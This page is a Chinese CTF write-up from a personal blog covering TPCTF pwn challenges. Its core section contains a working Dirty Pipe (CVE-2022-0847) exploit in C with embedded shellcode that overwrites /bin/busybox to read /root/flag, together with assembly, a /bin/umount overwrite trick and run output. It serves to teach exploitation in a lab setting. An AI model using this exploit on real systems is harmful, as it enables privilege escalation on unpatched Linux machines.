<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>TPCTF PWN - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
TPCTF  PWN  safthttpd &amp; core
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="TPCTF PWN" />
<meta property="og:description" content="
TPCTF  PWN  safthttpd &amp; core
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/tpctf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-01-22T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="TPCTF PWN"/>
<meta name="twitter:description" content="
TPCTF  PWN  safthttpd &amp; core
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">TPCTF PWN</h1>
			<div class="meta">Posted on Jan 22, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>TPCTF  PWN  safthttpd &amp; core</p>
</blockquote>
<p>比赛时就做了两题，safehttpd 除了密码可以爆出来，看不出来漏洞。
core 看了一眼bzImage kernel 5.8 就直接想到了 dirtypipe 那个CVE，没有看LKM</p>
<h2 id="safehttpd">safehttpd</h2>
<blockquote>
<p>真的有问题吗</p>
</blockquote>
<p>需要知道一个CVE，<a href="https://sourceware.org/bugzilla/show_bug.cgi?id=30068">CVE-2023-25139</a></p>
<h2 id="core">core</h2>
<blockquote>
<p>WOW，kernel 5.8 !</p>
</blockquote>
<h3 id="bin-权限">/bin 权限</h3>
<p>也算是比较常见的问题，bin目录权限属于 <code>ctf</code>，我们可以进行修改，因此修改 <code>/bin/umount</code> 程序就行，退出后会执行umount</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ rm -f /bin/umount
</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;cat /root/flag&#34;</span> &gt; /bin/umount
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#bd93f9">755</span> /bin/umount
</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">exit</span>
</span></span></code></pre></div><h3 id="cve-2022-0847">CVE-2022-0847</h3>
<p>内核版本属于kernel 5.8，属于dirtypipe 漏洞范围内，可以修改任意可读文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file bzImage
</span></span><span style="display:flex;"><span>bzImage: Linux kernel x86 boot executable bzImage, version 5.8.0 <span style="color:#ff79c6">(</span>vm@vm-pc<span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>shellcode：Linux 下的 <code>I/O</code> 相关函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;./run.sh&#34;</span>, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  sendfile(<span style="color:#bd93f9">1</span>, fd, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x40</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>写汇编</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#6272a4">; nasm -f elf64 shell.asm
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">; ld -s shell.s
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">; use pwntools
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">; open(&#39;/root/flag&#39;, 0) =&gt; shellcraft.open(&#39;/root/flag&#39;, 0)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">; I/O: 0拷贝
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">; sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#50fa7b">section</span> .text
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">global</span> _start
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">_start:</span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">/* open(&#39;/root/flag&#39;, O_RDONLY=0) */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">0x1016660</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">xor</span> DWORD PTR [rsp], <span style="color:#bd93f9">0x1010101</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">mov</span> rax, <span style="color:#bd93f9">0x6c662f746f6f722f</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> rax
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">mov</span> rdi, rsp
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">xor</span> esi, esi
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">2</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">pop</span> rax
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">syscall</span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">/* sendfile(out_fd, in_fd, offset=0, count=0x40) */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">0x40</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">pop</span> r10
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">pop</span> rdi
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">xor</span> edx, edx
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">mov</span> esi, eax
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">0x28</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">pop</span> rax
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">syscall</span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">/* exit(0) */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">xor</span> edi, edi
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">push</span> <span style="color:#bd93f9">60</span>
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">pop</span> rax
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">syscall</span>
</span></span></code></pre></div><p>因此学习了一下如何生成比较小的ELF文件，写了一个<a href="https://github.com/ldrx30/ShellcodeToELF">简单的工具</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">#define _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// clang-format off
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdnoreturn.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sched.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ipc.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/msg.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/user.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/syscall.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;linux/keyctl.h&gt;</span><span style="color:#ff79c6">
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#6272a4">// clang-format on
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> noreturn <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">err</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>msg) {
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;Error %s&#34;</span>, msg);
</span></span><span style="display:flex;"><span>  sleep(<span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  exit(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span> shellcode[] <span style="color:#ff79c6">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x7f</span>, <span style="color:#bd93f9">0x45</span>, <span style="color:#bd93f9">0x4c</span>, <span style="color:#bd93f9">0x46</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x3e</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x38</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x05</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x97</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x97</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x68</span>, <span style="color:#bd93f9">0x60</span>, <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x81</span>, <span style="color:#bd93f9">0x34</span>, <span style="color:#bd93f9">0x24</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0x2f</span>, <span style="color:#bd93f9">0x72</span>, <span style="color:#bd93f9">0x6f</span>, <span style="color:#bd93f9">0x6f</span>, <span style="color:#bd93f9">0x74</span>, <span style="color:#bd93f9">0x2f</span>, <span style="color:#bd93f9">0x66</span>, <span style="color:#bd93f9">0x6c</span>, <span style="color:#bd93f9">0x50</span>, <span style="color:#bd93f9">0x6a</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x58</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0xe7</span>, <span style="color:#bd93f9">0x31</span>, <span style="color:#bd93f9">0xf6</span>, <span style="color:#bd93f9">0x0f</span>, <span style="color:#bd93f9">0x05</span>, <span style="color:#bd93f9">0x41</span>, <span style="color:#bd93f9">0xba</span>, <span style="color:#bd93f9">0xff</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0xff</span>, <span style="color:#bd93f9">0xff</span>, <span style="color:#bd93f9">0x7f</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0xc6</span>, <span style="color:#bd93f9">0x6a</span>, <span style="color:#bd93f9">0x28</span>, <span style="color:#bd93f9">0x58</span>, <span style="color:#bd93f9">0x6a</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x5f</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x99</span>, <span style="color:#bd93f9">0x0f</span>, <span style="color:#bd93f9">0x05</span>, <span style="color:#bd93f9">0xEB</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">prepare_pipe</span>(<span style="color:#8be9fd">int</span> p[<span style="color:#bd93f9">2</span>]) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (pipe(p)) abort();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">unsigned</span> pipe_size <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      fcntl(p[<span style="color:#bd93f9">1</span>], F_GETPIPE_SZ); 
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">4096</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> r <span style="color:#ff79c6">=</span> pipe_size; r <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>;) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> n <span style="color:#ff79c6">=</span> r <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">sizeof</span>(buffer) <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">sizeof</span>(buffer) <span style="color:#ff79c6">:</span> r;
</span></span><span style="display:flex;"><span>    write(p[<span style="color:#bd93f9">1</span>], buffer, n);
</span></span><span style="display:flex;"><span>    r <span style="color:#ff79c6">-=</span> n;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> r <span style="color:#ff79c6">=</span> pipe_size; r <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>;) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">unsigned</span> n <span style="color:#ff79c6">=</span> r <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">sizeof</span>(buffer) <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">sizeof</span>(buffer) <span style="color:#ff79c6">:</span> r;
</span></span><span style="display:flex;"><span>    read(p[<span style="color:#bd93f9">0</span>], buffer, n);
</span></span><span style="display:flex;"><span>    r <span style="color:#ff79c6">-=</span> n;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv) {
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[*] start exploit&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] get page size&#34;</span>);
</span></span><span style="display:flex;"><span>  size_t page_size <span style="color:#ff79c6">=</span> sysconf(_SC_PAGE_SIZE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] get and check args&#34;</span>);
</span></span><span style="display:flex;"><span>  __off64_t offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> shellcode_len <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(shellcode);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/bin/busybox&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>    err(<span style="color:#f1fa8c">&#34;[x] cannot open file&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">stat</span> st;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (fstat(fd, <span style="color:#ff79c6">&amp;</span>st)) {
</span></span><span style="display:flex;"><span>    err(<span style="color:#f1fa8c">&#34;[x] get stat error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (offset <span style="color:#ff79c6">+</span> shellcode_len <span style="color:#ff79c6">&gt;</span> st.st_size) {
</span></span><span style="display:flex;"><span>    err(<span style="color:#f1fa8c">&#34;[x] write error! large then original file size&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] prepare pipe&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> pipe_fd[<span style="color:#bd93f9">2</span>];
</span></span><span style="display:flex;"><span>  prepare_pipe(pipe_fd);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] splice file&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">--</span>offset;
</span></span><span style="display:flex;"><span>  ssize_t nbytes <span style="color:#ff79c6">=</span> splice(fd, <span style="color:#ff79c6">&amp;</span>offset, pipe_fd[<span style="color:#bd93f9">1</span>], <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (nbytes <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
</span></span><span style="display:flex;"><span>    err(<span style="color:#f1fa8c">&#34;[x] splice error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] write content to target suid file&#34;</span>);
</span></span><span style="display:flex;"><span>  nbytes <span style="color:#ff79c6">=</span> write(pipe_fd[<span style="color:#bd93f9">1</span>], <span style="color:#ff79c6">&amp;</span>shellcode[<span style="color:#bd93f9">1</span>], shellcode_len);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (nbytes <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> nbytes <span style="color:#ff79c6">&lt;</span> shellcode_len) {
</span></span><span style="display:flex;"><span>    err(<span style="color:#f1fa8c">&#34;[x] write to file error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[*] finish exploit!!&#34;</span>);
</span></span><span style="display:flex;"><span>  close(fd);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>最终结果</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ ./exp
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> start exploit
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> get page size
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> get and check args
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> prepare pipe
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> splice file
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> write content to target suid file
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> finish exploit!!
</span></span><span style="display:flex;"><span>/ $ ls
</span></span><span style="display:flex;"><span>Segmentation fault
</span></span><span style="display:flex;"><span>/ $ <span style="color:#8be9fd;font-style:italic">exit</span>
</span></span><span style="display:flex;"><span>flag<span style="color:#ff79c6">{</span>123456<span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>Segmentation fault
</span></span></code></pre></div><h3 id="lkm">LKM</h3>
